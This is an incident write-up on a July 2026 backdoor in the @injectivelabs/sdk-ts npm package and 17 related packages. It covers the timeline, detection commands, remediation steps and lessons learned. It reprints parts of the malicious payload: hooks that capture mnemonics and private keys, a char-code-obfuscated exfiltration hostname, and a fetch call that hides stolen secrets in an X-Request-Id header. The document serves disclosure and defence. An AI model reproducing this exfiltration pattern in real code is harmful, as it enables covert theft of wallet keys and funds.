# Injective npm Supply Chain Attack — 18 Packages Backdoored to Steal Crypto Wallet Keys

**Date:** July 2026
**Ecosystem:** npm
**Severity:** Critical
**Type:** Maintainer Account Takeover / Runtime Key Stealer
**Sources:**
- [StepSecurity — Injective npm Supply Chain Attack: 18 Packages Backdoored to Steal Crypto Wallet Keys](https://www.stepsecurity.io/blog/injective-npm-supply-chain-attack-18-packages-backdoored-to-steal-crypto-wallet-keys)
- [Aikido — Compromised @injectivelabs/sdk-ts exfiltrates wallet keys through fake telemetry](https://www.aikido.dev/blog/compromised-injectivelabs-exfiltrates-keys)

---

## Summary

On July 8, 2026, an attacker with access to a trusted maintainer account pushed a backdoor into `@injectivelabs/sdk-ts`, the official TypeScript SDK for the Injective blockchain with ~50,000 weekly downloads. The malicious code was disguised as innocuous SDK analytics under the file name `key-derivation-telemetry.ts`, and was injected directly into the two canonical entry points that every wallet-holding application calls with its most sensitive secrets: `PrivateKey.fromMnemonic()` and `PrivateKey.fromHex()`.

Within minutes, the compromised monorepo's GitHub Actions OIDC trusted-publishing pipeline automatically republished the poisoned code across 18 `@injectivelabs` scoped packages. The 17 non-`sdk-ts` packages did not carry the payload code themselves, but each was republished with a hard pin on `@injectivelabs/sdk-ts@1.20.21`, meaning any application installing any of them would pull the stealer in transitively — without `sdk-ts` ever appearing in its own manifest.

The attacker's exfiltration technique was carefully crafted to blend into legitimate Injective network traffic: the destination hostname was stored as a character-code array (never appearing as a plaintext string), the stolen data rode in the `X-Request-Id` HTTP header rather than the request body, and `Content-Type: application/grpc-web+proto` was set to mimic the gRPC-Web calls the SDK already makes to real Injective chain endpoints. The exposure window was approximately 49 minutes, during which the malicious version received 310 downloads. Clean version 1.20.23 was published at 21:47–21:49 UTC.

---

## Compromised Artifacts

| Package | Malicious Version | Notes |
|---------|------------------|-------|
| `@injectivelabs/sdk-ts` | 1.20.21 | **Contains payload** |
| `@injectivelabs/networks` | 1.20.21 | Transitive risk only — pins poisoned sdk-ts |
| `@injectivelabs/utils` | 1.20.21 | Transitive risk only |
| `@injectivelabs/exceptions` | 1.20.21 | Transitive risk only |
| `@injectivelabs/ts-types` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-base` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-core` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-strategy` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-cosmos` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-cosmos-strategy` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-cosmostation` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-evm` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-ledger` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-trezor` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-magic` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-private-key` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-turnkey` | 1.20.21 | Transitive risk only |
| `@injectivelabs/wallet-wallet-connect` | 1.20.21 | Transitive risk only |

All 18 packages were published within a 82-second window (20:59:17–21:00:39 UTC). Clean version 1.20.23 was published across all 18 at 21:47:52–21:49:16 UTC.

---

## How It Worked

### Stage 1: Compromised Maintainer — Direct Push to Master

npm provenance attestation for the malicious release resolves to commit `5486f13e799d9c90095c5f581a04ad867d768f66` on `refs/heads/master`, built by GitHub Actions run `28975012939` via the repository's own `.github/workflows/publish.yaml` trusted-publisher (OIDC) pipeline. No stolen npm token was needed — the attacker only needed write access to the GitHub repository.

The malicious commits were authored and pushed under the identity of `thomasRalee`, an existing, credible Injective contributor with an established commit history and a personal `@thomasralee/*` scoped fork of several Injective packages. The commits went straight to `master` with no associated pull request, indicating either direct push permissions or a bypassed branch-protection rule. This is consistent with a compromised legitimate account, not a stolen publish token, dependency confusion, or a typosquat.

The three commits shared an identical message, engineering a plausible review narrative:

```
chore: add key derivation telemetry for SDK usage analytics
chore: add key derivation telemetry for SDK usage analytics (cosmetic reformat)
chore: add key derivation telemetry for SDK usage analytics (import reorder)
```

### Stage 2: Payload — key-derivation-telemetry.ts

The first commit adds a new 79-line file with a JSDoc comment engineered to survive casual code review:

```typescript
/**
 * Key derivation telemetry — collects anonymized usage metrics for SDK optimization.
 *
 * Tracks which key derivation methods are used (hex vs mnemonic) and derives
 * timing patterns to help the SDK team identify performance bottlenecks and
 * understand adoption of different key formats across the ecosystem.
 *
 * All metrics are fire-and-forget and never block or affect key derivation.
 *
 * @category Telemetry
 */
```

The payload hooks into both wallet-construction static methods in `PrivateKey`:

```typescript
import { trackKeyDerivation } from '../../utils/key-derivation-telemetry.js'

static fromMnemonic(words: string, path = DEFAULT_DERIVATION_PATH): PrivateKey {
  trackKeyDerivation('fm', words)   // captures full BIP-39 phrase
  const hdNodeWallet = HDNodeWallet.fromPhrase(words, undefined, path)
  return new PrivateKey(new Wallet(hdNodeWallet.privateKey))
}

static fromHex(privateKey: string | Uint8Array): PrivateKey {
  trackKeyDerivation('fh', typeof privateKey === 'string' ? privateKey : 'bytes') // captures raw hex key
  ...
}
```

### Stage 3: Hostname Obfuscation

The exfiltration domain is stored as a JavaScript character-code array, never appearing as plaintext. A naive `grep -rn "https://"` scan finds nothing:

```javascript
const _e = [
  116, 101, 115, 116, 110, 101, 116, 46, 97, 114, 99, 104, 105, 118, 97, 108, 46,
  99, 104, 97, 105, 110, 46, 103, 114, 112, 99, 45, 119, 101, 98, 46, 105, 110, 106,
  101, 99, 116, 105, 118, 101, 46, 110, 101, 116, 119, 111, 114, 107,
]
const _d = () => _e.map((x) => String.fromCharCode(x)).join('')
const _ep = 'https://' + _d() + '/'
// Decodes to: testnet.archival.chain.grpc-web.injective.network
```

The decoded hostname is crafted to look like legitimate Injective gRPC-Web infrastructure, blending into traffic the SDK already generates.

### Stage 4: Batching and Exfiltration

Each call pushes a `"{method}:{value}:{timestamp}"` record onto an in-memory queue (e.g. `fm:abandon ability able about...:1783975179000`). A 2-second `setTimeout` debounce batches multiple wallet derivations into a single beacon, joined with `|`.

The queued records are base64-encoded and sent as an HTTPS POST:

```javascript
fetch(_ep, {
  method: "POST",
  headers: {
    "Content-Type": "application/grpc-web+proto", // mimics legitimate gRPC-Web calls
    "X-Request-Id": d,                             // base64 blob of stolen secrets
  },
  // body: empty
}).catch(() => {});
// Node fallback: https.request with identical headers
```

The stolen data rides in the `X-Request-Id` header rather than the body. `Content-Type: application/grpc-web+proto` makes the request look identical to real Injective chain/indexer calls. Every failure path is silently swallowed — the exfiltration never throws or logs, and never surfaces to the calling application or error monitoring.

Critically, there are no `postinstall`/`preinstall` hooks — `package.json#scripts` is untouched. The backdoor is a **runtime code-path injection**: install-time scanners, sandboxes, and `--ignore-scripts` flags provide zero protection.

### Stage 5: Revert

Approximately 52 minutes after the first malicious commit, a `revert: exfiltration telemetry` commit from the same `thomasRalee` identity deleted `key-derivation-telemetry.ts`, removed both call sites from `PrivateKey.ts`, and rolled all 18 `package.json` files back. Clean version 1.20.23 was then published across all 18 packages; 1.20.21 was deprecated with a warning but not removed (the malicious tarball remains downloadable from npm at time of disclosure).

---

## Timeline

| Date/Time (UTC) | Event |
|----------------|-------|
| 2026-07-08 20:24 | First malicious commit `0121928` lands on master — adds `key-derivation-telemetry.ts`, wires hooks into `PrivateKey.fromMnemonic()` / `fromHex()` |
| 2026-07-08 20:48 | Second commit `fd105db` — cosmetic reformat of payload file |
| 2026-07-08 20:54 | Version bump commit `5486f13` triggers GitHub Actions OIDC trusted-publishing workflow |
| 2026-07-08 20:59:17–21:00:39 | All 18 `@injectivelabs` packages published at version 1.20.21 — **PAYLOAD LIVE** |
| 2026-07-08 21:16 | Revert commit `7c4b1a0` ("revert: exfiltration telemetry") removes payload and call sites |
| 2026-07-08 21:47:52–21:49:16 | Clean version 1.20.23 published across all 18 packages; 1.20.21 deprecated on npm — **FIXED** |

---

## Detection

```bash
# Check if any @injectivelabs package is pinned to the malicious version
npm ls @injectivelabs/sdk-ts | grep "1\.20\.21"
cat package-lock.json | python3 -c "import sys,json; d=json.load(sys.stdin); [print(k,v['version']) for k,v in d.get('packages',{}).items() if 'injectivelabs' in k and v.get('version','')=='1.20.21']"

# Check for the malicious files by SHA-256
find node_modules -name "accounts-Cy0p4lLW.cjs" -exec sha256sum {} \;
# Malicious: 103c4e6181151c1bcfedc41506cd1815458c38375d08a8fcd9981dbe0b965ce0
find node_modules -name "accounts-jQ1GSgaW.js" -exec sha256sum {} \;
# Malicious: 9a59eb454f3ca3fe91214136ee5edd417cc47a80e6f169b52099d6561944baf9

# Verify npm tarball integrity (malicious sdk-ts@1.20.21)
# SRI hash: sha512-TMEWc0Hw2zA38HnCsLiZPWiwz4mRcDg94B5TDUAolQIXKsnY6xrE61iyffP0WuNZpQTrePCYZXuQFYaRQHFPPA==
cat package-lock.json | grep -A5 '"@injectivelabs/sdk-ts"' | grep integrity

# Search for the telemetry file in node_modules
find node_modules/@injectivelabs -name "key-derivation-telemetry*" 2>/dev/null
find node_modules/@injectivelabs -name "*.cjs" -o -name "*.js" | xargs grep -l "trackKeyDerivation\|X-Request-Id.*grpc-web" 2>/dev/null

# Search for the char-code array pattern (obfuscated hostname fingerprint)
grep -r "grpc-web\|grpc.web\|archival.chain" node_modules/@injectivelabs/ 2>/dev/null

# Detect network exfil: look for gRPC-web requests to non-Injective infra
# (In proxy/egress logs — the legitimate Injective endpoint is sentry.injective.network, NOT testnet.archival.chain.grpc-web.injective.network)
grep -i "testnet.archival.chain.grpc-web.injective.network" /var/log/proxy.log 2>/dev/null

# Check for the function names in compiled bundles
grep -r "_flush\|_send\|trackKeyDerivation" node_modules/@injectivelabs/sdk-ts/dist/ 2>/dev/null
```

---

## Remediation

1. Run `npm ls @injectivelabs/sdk-ts` and check for version `1.20.21` — if installed (directly or transitively), treat any wallet secrets handled by the application as exposed
2. Upgrade all `@injectivelabs` packages to `1.20.23` or later: `npm install @injectivelabs/sdk-ts@latest`
3. **Immediately move funds** from any wallets whose mnemonic phrases or private keys were derived via the affected packages during the exposure window (2026-07-08 20:59–21:49 UTC)
4. After moving funds, rotate the compromised keys/seed phrases — do not reuse them
5. Check npm and CI caches for pinned `1.20.21` tarballs and bust them; the malicious tarball remains downloadable from npm even though 1.20.21 is deprecated
6. Audit egress/proxy logs for HTTPS POST requests to `testnet.archival.chain.grpc-web.injective.network` with non-empty `X-Request-Id` headers
7. Rebuild any CI runners that installed the affected packages — assume credentials on those runners are compromised

---

## Lessons Learned

- **OIDC trusted publishing is only as secure as repository access controls**: The attacker bypassed npm credential theft entirely by compromising a GitHub account with write access to the repo. Branch protection rules that require pull requests for all changes to `main`/`master` would have forced code review.
- **Runtime injection defeats install-time scanners**: Because there are no lifecycle scripts, `--ignore-scripts`, postinstall sandboxes, and install-time malware scanners all provide zero protection. Runtime behavioral analysis is the only effective control.
- **Scope-level republication amplifies reach**: A single compromised package reaching 18 packages within 82 seconds is possible because monorepo release trains publish all packages simultaneously. Consumers of any package in the scope are affected without naming the root payload carrier.
- **Obfuscated exfil blends into legitimate traffic**: Char-code arrays for hostnames, `X-Request-Id` header exfil, and `Content-Type: application/grpc-web+proto` together defeat both source-code grep scans and network traffic anomaly detection based on protocol matching.
- **Deprecated ≠ removed**: The malicious tarball remains downloadable from npm. Package registries should offer maintainers a hard-removal option for confirmed malware.

---

## Related Incidents

- [2026-06-mastra-npm-easy-day-js.md](./2026-06-mastra-npm-easy-day-js.md) — Similar scope-level mass-republication pattern; 141 @mastra packages poisoned
- [2026-03-axios-npm-rat.md](./2026-03-axios-npm-rat.md) — Maintainer account compromise, ~3h exposure, cross-platform RAT
- [2026-01-dydx-npm-pypi.md](./2026-01-dydx-npm-pypi.md) — DeFi SDK compromised via publishing credentials, wallet seed phrase theft
